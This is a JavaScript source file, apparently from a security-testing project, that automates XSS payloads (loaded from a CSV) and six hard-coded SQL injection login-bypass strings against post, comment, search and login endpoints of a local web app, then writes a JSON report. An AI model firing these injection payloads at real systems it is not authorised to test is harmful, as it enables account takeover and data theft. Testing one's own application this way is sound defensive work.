// attack-metrics/attack-runner.js
// Automated attack runner for XSS, SQLi, and other attacks

const axios = require('axios');
const fs = require('fs');

class AttackRunner {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.results = {
      xss: [],
      sqli: [],
      searchXss: [],
      postXss: [],
      commentXss: [],
      loginSqli: [],
      searchSqli: [],
      errors: []
    };
  }

  async runXSSAttacks() {
    const xssPayloads = fs.readFileSync('./Vulnerabilty-samples/xss_payloads_48.csv', 'utf-8')
      .split('\n')
      .slice(1);
    for (const payload of xssPayloads) {
      try {
        const res = await axios.post(`${this.baseUrl}/posts/new`, {
          title: payload,
          content: 'XSS test content'
        });
        this.results.postXss.push({payload, status: res.status});
      } catch (e) {
        this.results.errors.push({type: 'postXss', payload, error: e.message});
      }
    }
    for (const payload of xssPayloads) {
      try {
        const res = await axios.post(`${this.baseUrl}/posts/1/comment`, {
          comment: payload
        });
        this.results.commentXss.push({payload, status: res.status});
      } catch (e) {
        this.results.errors.push({type: 'commentXss', payload, error: e.message});
      }
    }
    for (const payload of xssPayloads) {
      try {
        const res = await axios.get(`${this.baseUrl}/search?q=${encodeURIComponent(payload)}`);
        this.results.searchXss.push({payload, status: res.status});
      } catch (e) {
        this.results.errors.push({type: 'searchXss', payload, error: e.message});
      }
    }
  }

  async runSQLiAttacks() {
    const sqlPayloads = [
      "' OR '1'='1",
      "admin' --",
      "' OR 1=1--",
      "' UNION SELECT * FROM users--",
      "' OR id IS NOT NULL OR '1'='1",
      "' OR '' = '"
    ];
    for (const payload of sqlPayloads) {
      try {
        const res = await axios.post(`${this.baseUrl}/login`, {
          username: payload,
          password: 'anything'
        });
        this.results.loginSqli.push({payload, status: res.status, data: res.data});
      } catch (e) {
        this.results.errors.push({type: 'loginSqli', payload, error: e.message});
      }
    }
    for (const payload of sqlPayloads) {
      try {
        const res = await axios.get(`${this.baseUrl}/search?q=${encodeURIComponent(payload)}`);
        this.results.searchSqli.push({payload, status: res.status});
      } catch (e) {
        this.results.errors.push({type: 'searchSqli', payload, error: e.message});
      }
    }
  }

  async runAllAttacks() {
    await this.runXSSAttacks();
    await this.runSQLiAttacks();
    return this.generateReport();
  }

  generateReport() {
    const timestamp = new Date().toISOString();
    const report = {
      attackTime: timestamp,
      results: this.results
    };
    fs.writeFileSync(`./reports/attack-${timestamp}.json`, JSON.stringify(report, null, 2));
    return report;
  }
}

if (require.main === module) {
  const runner = new AttackRunner('http://localhost:3000');
  runner.runAllAttacks().then(report => {
    console.log('Attack report generated:', report);
  });
}

module.exports = AttackRunner;
